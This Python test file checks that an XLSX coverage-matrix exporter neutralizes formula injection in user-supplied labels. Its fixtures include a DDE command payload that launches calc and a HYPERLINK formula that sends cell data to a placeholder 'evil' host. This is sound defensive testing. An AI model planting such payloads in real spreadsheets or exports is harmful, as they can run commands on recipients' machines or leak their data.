import io

from openpyxl import load_workbook

from accordance.exporters.coverage_matrix import MatrixColumn, build_coverage_matrix
from accordance.exporters.xlsx_exporter import to_xlsx_bytes
from accordance.kb.schema import Disclosure

HEADER_ROW = 4
FIRST_DATA = 5


def _kb_with_malicious_labels():
    return {
        "2-2": Disclosure(
            id="2-2",
            standard="=cmd|'/c calc'!A1",
            title="@SUM(1+1)*cmd",
            category="topic",
            requirement_text="x",
            required_elements=[{"id": "e", "desc": "d"}],
            retrieval_queries=["q"],
            suggested_fix_template="fix",
        ),
    }


def test_xlsx_neutralizes_formula_injection_in_user_strings():
    """Report names (column labels) and KB strings are user-controlled, and the
    export is shared with assessors. A cell starting with = + - @ would be
    executed by Excel/Sheets, so those must be neutralized to literal text."""
    col = MatrixColumn(
        label='=HYPERLINK("http://evil/?"&A1,"x")',
        score_by_id={"2-2": 5},
    )
    ws = load_workbook(
        io.BytesIO(to_xlsx_bytes(build_coverage_matrix(_kb_with_malicious_labels(), [col])))
    ).active

    assert not str(ws.cell(HEADER_ROW, 4).value).startswith(("=", "+", "-", "@"))
    assert "HYPERLINK" in str(ws.cell(HEADER_ROW, 4).value)

    assert not str(ws.cell(FIRST_DATA, 1).value).startswith(("=", "+", "-", "@"))
    assert not str(ws.cell(FIRST_DATA, 3).value).startswith(("=", "+", "-", "@"))

    assert ws.cell(FIRST_DATA, 4).value == 5

    footer = {ws.cell(r, 3).value: r for r in range(FIRST_DATA, ws.max_row + 1)}
    tot = footer["Total score"]
    assert str(ws.cell(tot, 4).value).startswith("=SUM")
